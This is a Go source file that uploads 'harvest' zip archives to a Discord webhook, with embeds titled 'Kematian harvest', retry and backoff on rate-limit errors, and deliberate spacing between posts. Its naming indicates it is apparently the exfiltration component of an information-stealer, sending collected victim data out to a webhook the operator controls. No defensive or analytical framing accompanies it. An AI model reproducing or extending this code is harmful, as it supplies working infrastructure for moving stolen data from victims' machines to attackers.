// discord.go — Discord webhook client for harvest zip uploads.
//
// Posts multipart/form-data with an embed (title + summary) and one file attachment.
// Retries on 429/5xx with linear backoff; callers should also space posts via
// discordUploadDelay to stay under webhook rate limits.
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"
)

type discordEmbed struct {
	Title       string `json:"title"`
	Description string `json:"description"`
	Color       int    `json:"color"`
}

type discordPayload struct {
	Content string         `json:"content,omitempty"`
	Embeds  []discordEmbed `json:"embeds,omitempty"`
}

const (
	// Gap between sequential webhook posts (webhook rate limits are aggressive).
	discordUploadGap = 2500 * time.Millisecond
	// Transient failures (rate limit / upstream) are retried this many times.
	discordUploadMaxRetry  = 5
	discordUploadRetryBase = 3 * time.Second
)

func discordUploadDelay() {
	time.Sleep(discordUploadGap)
}

// sendDiscordWebhook uploads one zip with retry on transient HTTP errors.
func sendDiscordWebhook(webhookURL, title, summary string, zipData []byte, filename string) error {
	return sendDiscordWebhookWithRetry(webhookURL, title, summary, zipData, filename, discordUploadMaxRetry)
}

func sendDiscordWebhookWithRetry(webhookURL, title, summary string, zipData []byte, filename string, maxAttempts int) error {
	if maxAttempts < 1 {
		maxAttempts = 1
	}
	var lastErr error
	for attempt := 0; attempt < maxAttempts; attempt++ {
		if attempt > 0 {
			backoff := discordUploadRetryBase * time.Duration(attempt)
			time.Sleep(backoff)
		}
		lastErr = postDiscordWebhook(webhookURL, title, summary, zipData, filename)
		if lastErr == nil {
			return nil
		}
		if !isDiscordRetryable(lastErr) {
			return lastErr
		}
	}
	return lastErr
}

func isDiscordRetryable(err error) bool {
	if err == nil {
		return false
	}
	msg := err.Error()
	return strings.Contains(msg, "HTTP 429") ||
		strings.Contains(msg, "HTTP 500") ||
		strings.Contains(msg, "HTTP 502") ||
		strings.Contains(msg, "HTTP 503") ||
		strings.Contains(msg, "HTTP 504")
}

func postDiscordWebhook(webhookURL, title, summary string, zipData []byte, filename string) error {
	if webhookURL == "" {
		return fmt.Errorf("discord webhook URL is required")
	}
	if len(zipData) == 0 {
		return fmt.Errorf("empty upload archive")
	}
	if title == "" {
		title = "Kematian harvest"
	}

	payload := discordPayload{
		Embeds: []discordEmbed{{
			Title:       title,
			Description: summary,
			Color:       0xE11D48,
		}},
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	if err := w.WriteField("payload_json", string(payloadJSON)); err != nil {
		return err
	}

	part, err := w.CreateFormFile("files[0]", filename)
	if err != nil {
		return err
	}
	if _, err := part.Write(zipData); err != nil {
		return err
	}
	if err := w.Close(); err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, webhookURL, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		msg, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return fmt.Errorf("discord webhook HTTP %d: %s", resp.StatusCode, string(msg))
	}
	return nil
}